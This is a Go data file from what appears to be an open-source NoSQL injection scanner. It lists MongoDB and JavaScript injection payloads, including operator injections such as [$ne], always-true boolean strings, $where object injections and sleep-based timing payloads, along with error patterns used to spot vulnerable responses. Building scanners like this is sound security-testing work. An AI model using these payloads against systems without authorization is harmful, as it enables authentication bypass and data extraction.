/*
Copyright © 2019 Charlie Belmer <Charlie.Belmer@protonmail.com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program. If not, see <http://www.gnu.org/licenses/>.
*/
package data

import (
	"strconv"
	"strings"
)

/**

TOOL CONSTANTS

**/
var Version string = "0.5.2"
var VersionName string = "Alpha"

/**

MONGO DATA

**/
var MongoSpecialCharacters = []string{"'", "\"", "$", ".", ">", "[", "]"}
var MongoSpecialKeyCharacters = []string{"[$]"}
var MongoJSONErrorAttacks = []string{`{"foo": 1}`}
var MongoPrefixes = []string{"'", "\""}
var MongoGetInjection = []string{"[$nin][]", "[$ne]", "[$gt]", "[$lt]"}
var ObjectPrefixes = []string{""}

/*
* Only use single quotes for JS injections. When creating injections, single quotes may
* be sweapped with double quotes for the entire test.
* True and false injections should always use the same quote type. For instance
* a true injection using something like && 'a'=='a' shouldn't be compared to
* false injection using && "a"!="a" because it may result in false positives.
 */
var JSPrefixes = []string{"", "'", `"`}
var JSSuffixes = []string{"", "'", `"`, `//`, `'}//`}
var JSTrueStrings = []string{
	` && 'a'=='a' && 'a'=='a`,
	` || 'a'=='a' || 'a'=='a`,
	`;return true;`,
}
var JSFalseStrings = []string{
	` && 'a'!='a' && 'a'!='a`,
	`;return false;`,
}

var sleepPlaceholder = `TimeToSleep`
var JSTimingStringsRaw = []string{
	`;sleep(` + sleepPlaceholder + `);`,
}
var JSTimingObjectInjectionsRaw = []string{
	`{"$where":  "sleep(` + sleepPlaceholder + `)"}`,
}

func JSTimingStrings(rawStrings []string, sleepTime int) []string {
	var injections []string
	for _, injection := range rawStrings {
		injections = append(injections, strings.ReplaceAll(injection, sleepPlaceholder, strconv.Itoa(sleepTime)))
	}
	return injections
}

var ObjectInjectionsTrue = []string{
	`{"$where":  "return true"}`,
	`{"$or": [{},{"foo":"1"}]}`,
	//	`,"$or": [{},{"foo":"1"}]`,
}
var ObjectInjectionsFalse = []string{
	`{"$where":  "return false"}`,
	`{"$or": [{"foo":"1"},{"foo":"1"}]}`,
}
var MongoErrorStrings = []string{
	`Uncaught MongoDB\\Driver\\Exception\\CommandException: unknown operator`,
	`(?i)MongoError`,
	`(?i)unterminated string literal`,
}

// Generic JS errors that don't indicate a specific subsystem, but may indicate JS Injection.
var JSSyntaxErrorStrings = []string{`SyntaxError`}

var MongooseErrorStrings = []string{
	`(?i)Cast to string failed for value`, // Seen when object being passed when string expected. May indicate that objects will be parsed as objects.
}

/* data extraction payload resources:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
https://packetstormsecurity.com/files/107999/Time-Based-Blind-NoSQL-Injection.html
https://blog.rapid7.com/2014/06/12/you-have-no-sql-inj-sorry-nosql-injections-in-your-application/
*/
